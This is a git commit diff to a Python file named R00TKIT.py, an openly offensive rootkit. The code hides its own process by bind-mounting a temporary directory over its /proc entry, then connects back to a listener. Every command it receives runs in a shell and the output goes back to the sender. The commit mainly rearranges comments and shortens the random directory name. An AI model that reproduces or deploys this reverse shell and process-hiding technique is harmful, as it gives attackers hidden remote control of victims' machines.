c1130f5ecfddcad54037150a2e844f102e22ebb4
Mohammad Askar <m.askar@isecur1ty.org>
2017-12-10 18:54:28 +0200

    Update R00TKIT.py

--- R00TKIT.py
+++ R00TKIT.py
@@ -13,22 +13,26 @@ import random as r
 
 # Strings to generate the temporary random process name from
 ch = string.uppercase + string.digits 
-token = "".join(r.choice(ch) for i in range(72)) 
+token = "".join(r.choice(ch) for i in range(5)) 
 pid = os.getpid() 
 # make bind mount on the current process folder in /proc to hide it 
 os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
 host = "localhost" 
 port = 8888 
-print "[+]Rootkit is working now , check your connection  .. " # print message (for debugging issues)
+# print message (for debugging issues)
+print "[+]Rootkit is working now , check your connection  .. " 
 def MakeConnection(h, p): 
     try: 
-		time.sleep(5) # Reverse connection interval
+		# Reverse connection interval
+		time.sleep(5) 
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		sock.connect((h, p))
 		while True:
-				command =  sock.recv(1024) r
-			        if command.strip("\n") == "exit": # Exit if the attacker sent exit command
-                		     sock.close() # Close socket
+				command =  sock.recv(1024)
+				# Exit if the attacker sent exit command
+			        if command.strip("\n") == "exit":
+				     # Close socket	
+                		     sock.close() 
        			        proc = subprocess.Popen(command, stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
         			proc_result = proc.stdout.read() + proc.stderr.read() 
         			sock.send(proc_result) 
